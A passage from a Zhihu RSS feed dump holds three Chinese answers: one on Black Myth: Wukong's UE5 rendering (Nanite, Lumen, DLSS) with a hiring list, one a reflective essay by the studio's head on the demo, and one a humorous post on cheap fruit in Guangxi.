data-private-watermark-src=\"v2-20a07b986fb2784bc2b19e293fef3680\"></p>\n<p><br></p>\n<p>有了Nanite之后我们遇到的最大问题反而是：我们之前很多的资产精度反而变得偏低了。后续一个很关键的工作，就是提升资产的质量。大家可以对比一下我们之前用的石头和现在用的石头。</p>\n<p>（左为新模型，右边是旧模型，每个颜色块都是一个三角形，越密代表面数越高）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d17ed7140db9c258abb1dd01ed3e7449_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1402\" data-rawheight=\"469\" data-watermark=\"watermark\" data-original-src=\"v2-d17ed7140db9c258abb1dd01ed3e7449\" data-watermark-src=\"v2-5cdabb16fc345f10649547b6fa7799e6\" data-private-watermark-src=\"v2-17043a1b6221c087afe20a88750e0b1e\"></p>\n<p>很多朋友可能会想，Nanite带来那么高精度的画面，是不是我的电脑更加带不动了。</p>\n<p><b>事实上刚好相反。</b></p>\n<p>Nanite本身的作用是优化性能。正是因为性能优化了，才有能力渲染更高精度的模型。</p>\n<p>相同精度的模型，基本上在Nanite下渲染都能获得比以前好得多的性能。</p>\n<p>实际上Nanite才是拯救显卡的神器。</p>\n<p>我们非常多的场景在Nanite的加持下获得50%以上的帧率提升。</p>\n<p>以视频中这个大殿为例，是一个复杂度非常高的场景，里头的亭台楼阁都是非常精细的、可以放大作为场景建筑使用的高面数模型，在RTX2060@1080p下，开启Nanite可以轻松达到接近70fps，而关闭后大概是38fps左右。提升非常明显。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fd646dd30287477e7069622527700453_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1391\" data-rawheight=\"698\" data-watermark=\"watermark\" data-original-src=\"v2-fd646dd30287477e7069622527700453\" data-watermark-src=\"v2-aea57c7c235d7f832ff816a852a6db17\" data-private-watermark-src=\"v2-ff084a103eb10b7b13dc17c9946eeea8\"></p>\n<p><b>-Lumen</b></p>\n<p>UE5另一个非常强大的功能是Lumen全局光照。</p>\n<p>引用一段Epic官方的话：该系统能在宏大而精细的场景中渲染间接镜面反射和可以无限反弹的漫反射；小到毫米级、大到千米级，Lumen都能游刃有余。</p>\n<p>具体的技术细节这里就不多说了，大家可以看对比图感受一下Lumen的对光照品质的提升</p>\n<p>（对比图均为上图关闭lumen、下图开启lumen）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-0b8ad90480df441cb610c009c300bbad_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"706\" data-watermark=\"watermark\" data-original-src=\"v2-0b8ad90480df441cb610c009c300bbad\" data-watermark-src=\"v2-1ae317f5bbd633c0f2cabcc058f8de25\" data-private-watermark-src=\"v2-dc258b74d7a3aa5ffa9d60ba49fb37cd\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-3208627b1af1a277bb4d03c33ba939cc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"698\" data-watermark=\"watermark\" data-original-src=\"v2-3208627b1af1a277bb4d03c33ba939cc\" data-watermark-src=\"v2-a0a35fcd27b033e20f27e2760902f1f9\" data-private-watermark-src=\"v2-4f0f68d384a9312846b27b4950fe31b6\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-45502daee7f708580693a6945e89aa6c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"700\" data-watermark=\"watermark\" data-original-src=\"v2-45502daee7f708580693a6945e89aa6c\" data-watermark-src=\"v2-6e720b56c38479b28a8be98f10968293\" data-private-watermark-src=\"v2-43b1297f9eda5455dfed28f1e9b702c2\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-3982bb6349b87667a163945b0621c1cc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"700\" data-watermark=\"watermark\" data-original-src=\"v2-3982bb6349b87667a163945b0621c1cc\" data-watermark-src=\"v2-4e3c3cbfd437380aa32488859e2263e5\" data-private-watermark-src=\"v2-8850b668d37e16700d8a9212676aaf54\"></p>\n<p><b>-DLSS</b></p>\n<p>广大游戏玩家应该听过Nvidia DLSS的大名：Deep Learning Super Sampling。</p>\n<p>这是Nvidia在RTX平台下的性能优化神器，DLSS通过深度学习神经网络渲染媲美原生分辨率画质的画面，同时还能显著提升帧率。</p>\n<p>可以说是一种“免费午餐”。</p>\n<p>这次我们也集成了DLSS，这也是这次能够顺利实现4k录制的一个利器。</p>\n<p>下图可以看到，基本不变的画面，帧率从44.72提升到71.42（RTX2060@1080p，DLSS开启Balanced模式）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-fd3b03bba069566f7e9c68c1dfc71c60_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1383\" data-rawheight=\"734\" data-watermark=\"watermark\" data-original-src=\"v2-fd3b03bba069566f7e9c68c1dfc71c60\" data-watermark-src=\"v2-258df9cede19ac4e8643eed324839707\" data-private-watermark-src=\"v2-129e3d2060ab413e76f3f9d9c0e98bce\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d8c4ab9624c43a0fb504f3bf9f35874c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1385\" data-rawheight=\"728\" data-watermark=\"watermark\" data-original-src=\"v2-d8c4ab9624c43a0fb504f3bf9f35874c\" data-watermark-src=\"v2-23bae031a5298ef1947c6506760f834a\" data-private-watermark-src=\"v2-4ae2dd84da5b39f7ad93a071a2734eb2\"></p>\n<p><b>-后续我们会做什么？</b></p>\n<p>由于我们从拿到UE5到完成视频录制大概只有两个多月的时间，这次视频的制作时间可以说是非常紧张，实际上我们还有非常多的适配、优化工作没有完成，还没有完全发挥引擎的威力。无论画质提升和性能优化，依旧有非常大的空间。</p>\n<p>这次的开发也给了我们很大的信心，目前来看性能优化的进度是稳步前进的。我们的目标依然是瞄准主流玩家的pc配置。所以目前广泛使用的显卡（当然是指独立显卡 XD），我们是会全力支持适配的，各位担心显卡会燃烧的玩家请放心~<br></p>\n<p><b>-We're still Hiring！</b></p>\n<p>是的，我们<b> 仍 然 </b>在招聘。</p>\n<p>在这个视频中展示了非常多优秀的特性也都需要归功于各位同事出色的工作，比如可互动的雪地、破碎冰面、龙的各种动画机制等等，这些都离不开优秀成员的加入。</p>\n<p>去年大家热情澎湃，我们收到惊人多的简历（真的非常非常非常多），但由于招聘人数和投递人数的比例非常夸张，所以很多朋友没有加入我们，只是因为缘分未到，很多朋友真的非常优秀，也再次感谢大家对我们的支持。</p>\n<p>具体的职位，可以参考下面的列表，或者到招聘渠道中了解相关信息。</p>\n<p><b>同时也提醒大家，由于私信非常容易遗漏，也给统计简历信息带来非常大的困难，希望大家都通过官方渠道（见下面，包括拉钩和招聘邮箱）投递简历，谢谢大家的理解！</b><br></p>\n<p>完整招聘岗位列表请见官网：</p>\n<p><a href=\"http://link.zhihu.com/?target=http%3A//www.heishenhua.com/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">《黑神话：悟空》官网</a></p>\n<p><br></p>\n<p>简历投递</p>\n<p><u>拉钩：<a href=\"http://link.zhihu.com/?target=https%3A//hr.lagou.com/company/gongsi/j36721.html\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">hr.lagou.com/company/go</span><span class=\"invisible\">ngsi/j36721.html</span><span class=\"ellipsis\"></span></a></u></p>\n<p>邮箱：<u><a href=\"mailto:hr@gamesci.com.cn\">hr@gamesci.com.cn</a></u></p>\n<p><br></p>\n<p>技术：</p>\n<p>UE图形程序</p>\n<p>UE渲染TA</p>\n<p>UE动画开发</p>\n<p>后台开发工程师</p>\n<p>IT运维工程师<br></p>\n<p>产品：</p>\n<p>游戏编剧<br></p>\n<p>设计：</p>\n<p>剧情动画设计师</p>\n<p>关卡动画设计师</p>\n<p>3D特效设计师</p>\n<p>动捕操作员</p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/uddwilliam?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">招招</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/481112589/answer/2072119480?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1627 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/480857493?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">通过本次的预告站，你认为游戏《黑神话：悟空》有哪些需优化的地方？</a><br><a href=\"http://www.zhihu.com/question/480849849?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价游戏《黑神话：悟空》8 月 19 日上线的预告站，透露了哪些信息？</a><br>\n","link":"http://www.zhihu.com/question/481112589/answer/2072119480?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"8 月 20 日游戏科学放出《黑神话：悟空》 UE5 实机内容演示，有哪些新信息？","date":"2021-08-20 03:00:10","description":"\n<p><b>视频集锦，莫要轻信。蒙君垂目，砥砺前行。</b></p>\n<p><br></p>\n<p>上一年曾祝大家睡到自然醒，结果从去年的820到今天，我自己这一年的睡眠反而不太行……</p>\n<p>非要形容这个状态的话，大概就是战战兢兢，如履薄冰，才不配位，强装镇定。</p>\n<p>不仅因为第一部视频发布后的关注度与期待值，远远超越我们最乐观的预期。</p>\n<p>更因为做游戏视频，比做游戏简单得多；而做游戏，又比做一个好玩的游戏简单得多。</p>\n<p>关注越大，责任越大。</p>\n<p>中途的调整、失误与花边，也越容易被放大。</p>\n<p><br></p>\n<p>哪怕时隔了整整一年，我依然不时产生如“为啥有这么多人在看着”的不真实感，以及两种之前不曾有过的情绪。</p>\n<p><b>一是恐惧。</b>一边频繁感受到大家热切而真诚的期望，一边深知自己的能力短板与实力局限。正如庄子说“水之积也不厚，则其负大舟也无力”。在动作角色扮演的大方向上，我们的研发积累刚刚起步，用户理解严重不足，纵然竭尽全力，又岂能尽如人意？</p>\n<p><b>二是焦虑。</b>团队每天实际要面对的，永远是庞杂而具体的开发工作，其中不乏两难选择与细节魔鬼。比如：</p>\n<p>如何最大程度保留西游经典的精气神，又创作出耳目一新的故事与设定？</p>\n<p>动作乐趣的核心是什么？战斗难度的上下限在哪里？首领是更多考核肌肉反应还是规则理解？</p>\n<p>无比渴望使用最前沿的引擎技术与图形学成果，又疯狂担心变成显卡危机与煎蛋利器</p>\n<p>猴子本身作为一个神通广大的神话英雄，在还原招牌能力与法术时，怎样才能不破坏关卡体验的稳定与量产？</p>\n<p>所谓“史诗感”，“大作气质”，“次世代范儿”到底重点是啥？不计成本的细节堆砌？超高的内容完成度？数百分钟的剧情表演与数百万字的配音文本？</p>\n<p>每加入一个自以为牛逼的新特性与新技术，距离项目全局进度失控的开发地狱便更进一步。而且由于大多数时候都在无人区摸索，所有的坑都得亲自趟过一次，或者好几次……</p>\n<p>所以昨日预告站的几个小视频，绝非刻意调侃的事后玩笑，而是漫长研发历程中苦中作乐的无奈自嘲。这些看似荒诞的BUG与困局，只是这几年层出不穷奇葩事故的冰山一角。此时此刻它们不但没有消失，反而子孙满堂活得贼好。</p>\n<p><br></p>\n<p>可能有朋友知道，我前段时间在猛看东京奥运会。</p>\n<p>其中最打动我的，不是摘取金牌的高光时刻，而是两次中国队失利时主将的眼泪。</p>\n<p>一次是小枣，她哭着说对不起大家，辜负了大家。</p>\n<p>一次是郎导，她同样因为对不起球迷而数度哽咽。</p>\n<p>她们已是各自领域难以超越的巅峰，尤其是郎导，可谓创造竞技体育不二历史的女性传奇，心智之成熟坚韧想必远超常人。但即便如此，尚且难以在被淘汰后克制住自己辜负他人期待的负罪之情。</p>\n<p>我不配说能感同身受体会她们的心情，但那充满歉意的泪水，一定是真实的。</p>\n<p>哪怕过程中付出所有，没有达到预期的结果就会难过，甚至更加难过。</p>\n<p>因为你清楚地知道，有那么多人在爱着你。</p>\n<p><br></p>\n<p>我们没有资格说自己苦，太多人比我们更苦，更努力，压力更大。</p>\n<p>我们也没有资格说自己做出了什么成绩，因为本就没有成绩值得一提。</p>\n<p>我们只是想在认准的方向，以平常心走下去。慢慢走，争取走远一点，邂逅更多有爱的伙伴，探开更多未知的迷雾。如果在路上偶遇几只可爱的妖精，只当是别样的风景，心如止水，安之若素。</p>\n<p><b>今年制作这部视频的初衷，依然是希望所有关心游戏科学与黑神话的朋友，在看完之后能再放心一丢丢——知道我们仍在那条小路上从容的晃荡，队伍日渐壮大，产出稳定顺滑。</b>虽说一年能走的总步数有限，减肥的初心从未改变。各位若平日还有闲情，也不妨多做几个深蹲与俯卧撑，而不是老惦记那个并不存在的发布时辰[狗头]</p>\n<p><br></p>\n<p>最后，我想再提一次中国女排。她们作为上届里约奥运会的卫冕冠军兼2019年世界杯冠军，经过了五年艰苦卓绝的备战，却在本届小组赛出师不利，遭遇三连败后惨遭淘汰，这也是1984年洛杉矶以来女排在奥运会的最差成绩。但就在“历史最低排名”仅仅两天后，她们在第四轮又用一个3:0，豪迈击溃了此前三战全胜小组排名第一的意大利队。赛后所有队员与教练组开心地抱成一团，脸上的笑容如花般灿烂。</p>\n<p>这样豁达、投入、尽情享受当下比赛（在已无法出线的背景下）的痛快状态，让我似乎看到了女排精神的另一面。当时心有所感，跑到微博为姑娘们写了一段顺口溜，少许改动后偷懒放在这里，与诸君共勉：</p>\n<blockquote>翻过那座山，前方是爬不完的峰峦<br>趟过那条河，身上是拧不干的冷汗<br>蟠桃宴的座次与你无关<br>生死簿的名字涂抹增删<br>命运的绝句从不押韵<br>英雄的结局大多平淡，偶尔不堪<br>意料之外的金刚琢，永不回岸的无底船<br>每个传奇的故事里，都没有白给的仙丹<br>祝福所有的泪与伤，血与汗，梦想与苦难<br>唯愿你认真享受每一场战斗<br>肆无忌惮的格挡、闪避、变化、呼喊<br>用尽全部运气与勇敢<br>饱尝一切荣辱与悲欢</blockquote>\n<p><br></p>\n<p>黑猴子已足够幸运，这篇回答也已足够矫情，再次感谢各位的关注、垂青与批评。</p>\n<p>那些始终相信我们的人，我一直看得到你们，除了把事做好，无以为报。</p>\n<p>来日方长，祝身心健康。</p>\n<p><br></p>\n<p><br></p>\n<p>（了解最新的招聘信息访问 <a href=\"http://link.zhihu.com/?target=http%3A//www.heishenhua.com/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">www.heishenhua.com</a>。恳请合规投递，切莫私信联系）</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yocar?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">冯骥</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/481112589/answer/2072044600?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1627 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/480857493?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">通过本次的预告站，你认为游戏《黑神话：悟空》有哪些需优化的地方？</a><br><a href=\"http://www.zhihu.com/question/480849849?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价游戏《黑神话：悟空》8 月 19 日上线的预告站，透露了哪些信息？</a><br>\n","link":"http://www.zhihu.com/question/481112589/answer/2072044600?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"有哪些事是你到广西才知道的？","date":"2021-08-19 08:04:23","description":"\n<p>知乎对广西这宝藏地的讨论还有点少诶，给大家安利一下他们的水果。</p>\n<p><br></p>\n<p><b>10块钱以上的水果，滚出广西！(不是)</b></p>\n<p><br></p>\n<p>之前向大家安利<a href=\"http://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMjM5NjAxMjM4MA%3D%3D%26mid%3D2652330753%26idx%3D1%26sn%3D3becc0e388cdfb1fccc62e723684be46%26chksm%3Dbd0c33328a7bba24a481fb039d0812d66aba694faccb6588b8c0fc105436733c06ab786d6cab%26scene%3D21%23wechat_redirect\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">徐闻菠萝</a>的时候，我也曾怀着一颗虔诚的吃货之心搜刮了国内各个地方好吃的水果代表</p>\n<p>比如川渝地区的丑柑耙耙柑，东北地区的草莓，新疆的香梨大枣葡萄，陕西的苹果猕猴桃等等</p>\n<p><img src=\"https://pic3.zhimg.com/v2-66882765c9bcc028a5aef11a0336392a_720w.jpg?rss\" data-rawwidth=\"322\" data-rawheight=\"270\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-66882765c9bcc028a5aef11a0336392a\" data-watermark-src=\"v2-c4d7329619fa42dd90585411bee9e7ff\" data-private-watermark-src=\"v2-9de9f11d3e3ef49415aee3fb04cbe0e4\"></p>\n<p>在此过程中，我有一个惊奇的发现，那就是只要提到水果，广西的呼声真的惊人的高</p>\n<p>没别的原因，实在是广西的<b>水果种类也太多了</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d1f25cfad8cc674fc76567072041c628_720w.jpg?rss\" data-rawwidth=\"556\" data-rawheight=\"128\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-d1f25cfad8cc674fc76567072041c628\" data-watermark-src=\"v2-4e2702fa619db43d9466a0f02ba6a07d\" data-private-watermark-src=\"v2-6dc2f77ec6fe828d779b4bd2dc92a801\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-a5c7731bbbf2c39cb66f3f5e33aa43b7_720w.jpg?rss\" data-rawwidth=\"557\" data-rawheight=\"130\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a5c7731bbbf2c39cb66f3f5e33aa43b7\" data-watermark-src=\"v2-3cb37d7bb8bd5d5c2ea8dfafafbf6476\" data-private-watermark-src=\"v2-b381e49139b028557f402313a7a0a2b9\"></p>\n<p>你能想到的日常的不日常的见过的没见过的水果，从地里挖的到树上结的到藤上挂的，广西好像都有</p>\n<p>最关键的是，人家不仅多，还贼便宜</p>\n<p>红心火龙果10块钱9个</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9ec506f964c19342a5ee12019a95c3fd_720w.jpg?rss\" data-rawwidth=\"400\" data-rawheight=\"604\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-9ec506f964c19342a5ee12019a95c3fd\" data-watermark-src=\"v2-0c813ec42a5c9f618a314f462126aee5\" data-private-watermark-src=\"v2-0dc5e63890be3d1333d9dd71a6d0f444\"></p>\n<p>2.5一斤的这大芒果！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a0827afa905236326f1fcf5ca1063c00_720w.jpg?rss\" data-rawwidth=\"622\" data-rawheight=\"458\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a0827afa905236326f1fcf5ca1063c00\" data-watermark-src=\"v2-bc8c8a5c33ef5cc6cbd50dec5227ce03\" data-private-watermark-src=\"v2-6d227bd21f41701dd4e3431055ec5aa7\"></p>\n<p>1.5一斤的这大香蕉！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-17ab12cd91a948b7823a44dd70520e95_720w.jpg?rss\" data-rawwidth=\"594\" data-rawheight=\"335\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-17ab12cd91a948b7823a44dd70520e95\" data-watermark-src=\"v2-a7a6d1d739d15d81106e830615379f4b\" data-private-watermark-src=\"v2-892adce4e5c2e0bc1cf262f1fc71f1fa\"></p>\n<p>一块钱一斤的这是李还是别的什么玩意儿我也不敢瞎说</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4d7646c7a317700b6af79e7d880e36b5_720w.jpg?rss\" data-rawwidth=\"612\" data-rawheight=\"662\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4d7646c7a317700b6af79e7d880e36b5\" data-watermark-src=\"v2-b3c210e041c5a3b321ef6306c7fe6158\" data-private-watermark-src=\"v2-103eb411c49ff2a30f8ce680d252b865\"></p>\n<p>甚至连以娇气难伺候著称的奢侈杨梅也罕见的卖出了个位数的价格</p>\n<p><img src=\"https://pic4.zhimg.com/v2-683478b495c562eb4dd4b04f4c1288bb_720w.jpg?rss\" data-rawwidth=\"548\" data-rawheight=\"694\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-683478b495c562eb4dd4b04f4c1288bb\" data-watermark-src=\"v2-807d60b18ff611301d445286bdbb2033\" data-private-watermark-src=\"v2-d3cecc7f2c13ebd8eeec13f2dcc7dd54\"></p>\n<p>据凡尔赛协会广西分会的朋友介绍：</p>\n<p>图上这价算贵的，9毛一斤的大桃你见过吗？</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8c4be8545540248468a84af25904bdd8_720w.jpg?rss\" data-rawwidth=\"472\" data-rawheight=\"499\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-8c4be8545540248468a84af25904bdd8\" data-watermark-src=\"v2-64988c9c5cc0cc7f77d966b423317d8c\" data-private-watermark-src=\"v2-87027e9ea510030bb396ae54c9fa4749\"></p>\n<p>毕竟，在广西除了榴莲以外，不配有水果10元以上</p>\n<p>听到高于10元的水果我转身就走，因为它下个礼拜就10元3斤了</p>\n<p><img src=\"https://pic4.zhimg.com/v2-41f98371e3b79ca39adaae4f4abcad5c_720w.jpg?rss\" data-rawwidth=\"604\" data-rawheight=\"292\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-41f98371e3b79ca39adaae4f4abcad5c\" data-watermark-src=\"v2-4f62a1590b7234b9eeace2e91be7ef29\" data-private-watermark-src=\"v2-38d8ea3356d217212c9849af4ded1ace\"></p>\n<p>众所周知，夏天正是吃水果的季节</p>\n<p>所以这两天，一场以【水果自由】为主题的凡尔赛大会正在如火如荼的进行</p>\n<p><img src=\"https://pic1.zhimg.com/v2-bdbf372899aef8b9b7904d2b91e2394f_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"1039\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-bdbf372899aef8b9b7904d2b91e2394f\" data-watermark-src=\"v2-7ee0005877b4d8c4c622eafef71f5d40\" data-private-watermark-src=\"v2-b5efb30e358b66321865556147c1e899\"></p>\n<p>当然了，参赛者大部分来自广西</p>\n<p>发言内容包括但不局限于：</p>\n<p><b>不都这个价？</b></p>\n<p><b>这还便宜？</b></p>\n<p><b>我都当饭吃！</b></p>\n<p><b>我都快吃腻了~</b></p>\n<p><b>广西人：为什们你们会觉得便宜，全国水果不都是这个价吗？</b></p>\n<p>外省网友：真不是这个价</p>\n<p><img src=\"https://pic4.zhimg.com/v2-78c56a20b16992ef53cee871930e63ac_720w.jpg?rss\" data-rawwidth=\"754\" data-rawheight=\"88\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-78c56a20b16992ef53cee871930e63ac\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-b54aae5ccf75aa3d7d995b2ef9e2aa2a_720w.jpg?rss\" data-rawwidth=\"973\" data-rawheight=\"164\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-b54aae5ccf75aa3d7d995b2ef9e2aa2a\" data-watermark-src=\"v2-96981ed964a74955d091bbf040408ba5\" data-private-watermark-src=\"v2-0ba44828bbb9d1ac5e1a29e3ff915943\"></p>\n<p><b>广西人：讲真的在钦州荔枝一般俩三块一斤，杨梅也是俩三块，8块太贵了，不吃</b></p>\n<p>外省网友：之前宿舍里的广西同学从老家拿了荔枝和杨梅跟大家分享</p>\n<p>我们都很有默契的一人只拿了一个</p>\n<p>因为感觉但凡多拿一个都破费了，坐标北京</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8fdeb9a92b6dbb27a34ccb3448e1eed2_720w.jpg?rss\" data-rawwidth=\"613\" data-rawheight=\"292\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-8fdeb9a92b6dbb27a34ccb3448e1eed2\" data-watermark-src=\"v2-c7e5f1d8127d6fab1c96d1e40ccbb6fe\" data-private-watermark-src=\"v2-07f90c2238ffa1b5aa3ee72271495d21\"></p>\n<p><b>广西人：10块钱9个不够拿出来说，上次10块钱买了12个火龙果，我当饭吃</b></p>\n<p>外省网友：一点都不羡慕，因为他会窜稀</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1de1c3bf84b53cd381f852bab33efc28_720w.jpg?rss\" data-rawwidth=\"461\" data-rawheight=\"587\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-1de1c3bf84b53cd381f852bab33efc28\" data-watermark-src=\"v2-2723082aa3cc1314dc21cc2d0f8aefb2\" data-private-watermark-src=\"v2-7a88958b6614e54793c3956f08505ea9\"></p>\n<p>外省网友<b>：</b>上次去浦北县，路边遇到一个卖香蕉的老奶奶，我问怎么卖，她说4块钱</p>\n<p>我寻思这跟我想象的不一样啊，不都说广西水果便宜吗</p>\n<p>但我转念一想，老人年纪大了，腿脚不利索，出来挣点小钱卖贵点也能理解，我说给我来两斤吧</p>\n<p>然后奶奶说：<b>两斤不卖，4块钱一把</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-d28806e94ad739e3bf611c3edd63145f_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"520\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-d28806e94ad739e3bf611c3edd63145f\" data-watermark-src=\"v2-ec536111c4afd6e1b9416e4dcd523557\" data-private-watermark-src=\"v2-1a20f9ab4781b79b12504652017d83fa\"></p>\n<p>广西人：这对走在路上随便一颗树都能挂满果的广西来说，真不算什么</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b2b3b19892280c3818d94cea5a1c3b72_720w.jpg?rss\" data-rawwidth=\"489\" data-rawheight=\"699\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-b2b3b19892280c3818d94cea5a1c3b72\" data-watermark-src=\"v2-a57eb59d67c4f8fafee66ae635d25fd7\" data-private-watermark-src=\"v2-fe2fe75d53aa28f4b0e214fe01870466\"></p>\n<p>以上都是网友们的感性认知，但众所周知，感性认知不靠谱</p>\n<p>那从数据上看，广西水果怎么样呢？</p>\n<p>据统计，2018年，广西以1790万吨的水果产量<b>从全国第五跃升到全国第一</b></p>\n<p>2019年，成为全国首个产量超2000万吨的水果大省（区）</p>\n<p><b>总量雄踞全国榜首</b>，分别比随后的两省区多112万吨和224万吨</p>\n<p>而且柑橘、芒果、柿子、火龙果、百香果均位列<b>全国第一</b></p>\n<p>2020年，全区水果种植面积达2058万亩，总产量超2461万吨，<b>水果产业发展成为千亿元产业</b></p>\n<p>好家伙，看了数据后我发现，网友吹广西水果，吹得还是太收着了</p>\n<p>但其实就像我开篇所说，中国地大物博，好吃的水果到处都有，完全不必搞什么拉踩</p>\n<p>但可能很多人也会有疑惑为什么处在同纬度的广东、福建，甚至更低纬度的海南，没能成为广西这样的水果大省</p>\n<p>气候完全不输啊，甚至还更湿润一些</p>\n<p>广西独占鳌头，水果种类这么齐全，它究竟为什么？</p>\n<p>两个方面一是<b>地形气候</b></p>\n<p>广西有山地有丘陵有盆地有海湾，形成了多样的种植环境，干湿分明亚</p>\n<p>热带季风区降雨丰富，日照足、各种植物都能在这里肆意生长</p>\n<p>据资料统计，目前广西现种植的水果已经多达47科85属237种</p>\n<p><img src=\"https://pic2.zhimg.com/v2-bf927dfff31784600b786758a72fb3e6_720w.jpg?rss\" data-rawwidth=\"510\" data-rawheight=\"676\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-bf927dfff31784600b786758a72fb3e6\" data-watermark-src=\"v2-ffb1c5d00173c2fe54a19c5ab466ad20\" data-private-watermark-src=\"v2-26b54ae8945fd8ff13e465532243e879\"></p>\n<p>二是<b>进口量大</b></p>\n<p>2019年，广西区域内柑产量达到1124万吨，并与俄罗斯签订了2000万斤的订单，标志着中国沃柑正式走出了国门</p>\n<p>与此同时，广西的水果进口量也是全国最多的</p>\n<p>早些年，中国和东盟国家达成了农产品零总税的合作战略</p>\n<p>各个东盟国家的农产品都可以涌入中国</p>\n<p>所以一到水果季，不止是广西的水果上市，同样季候的东盟国家的水果也跟着上市</p>\n<p>越南走陆路，泰国的走水路，芒果、山竹、榴莲等等，也给广西的水果多样性增添了色彩</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6b8b09869b041b2285677e9672c4fdb9_720w.jpg?rss\" data-rawwidth=\"541\" data-rawheight=\"639\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-6b8b09869b041b2285677e9672c4fdb9\" 